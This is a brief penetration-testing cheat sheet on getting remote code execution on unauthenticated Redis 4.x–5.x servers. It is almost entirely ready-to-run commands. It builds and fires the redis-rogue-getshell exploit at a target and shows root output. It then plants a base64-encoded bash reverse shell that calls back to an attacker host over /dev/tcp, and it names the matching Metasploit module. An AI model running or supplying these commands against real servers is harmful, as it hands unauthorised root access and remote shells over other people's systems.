---
description: Redis 4x-5x RCE
---

# Redis RCE

6379/tcp open redis Redis key-value store 5.0.9

redis-cli -h 192.168.1.2 No need password :)

[https://github.com/vulhub/redis-rogue-getshell](https://github.com/vulhub/redis-rogue-getshell)

```
$ git clone https://github.com/vulhub/redis-rogue-getshell.git
$ cd redis-rogue-getshell
$ cd RedisModulesSDK
$ make
$ cd ..

$ python3 redis-master.py -r 192.168.1.2 -p 6379 -L 192.168.1.1 -P 80 -f RedisModulesSDK/exp.so -c "id"

euid=0(root) gid=0(root) groups=0(root)
```

### Reverse shell

```
/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1 - Base64 Encoded

$ python3 redis-master.py -r 192.168.1.2 -p 6379 -L 192.168.1.1 -P 80 -f RedisModulesSDK/exp.so -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xLzgwIDA+JjE= | base64 -d > /tmp/shell.sh"

$ python3 redis-master.py -r 192.168.1.2 -p 6379 -L 192.168.1.1 -P 80 -f RedisModulesSDK/exp.so -c "bash -p /tmp/shell.sh"
```

**msf5 > use linux/redis/redis\_replication\_cmd\_exec**
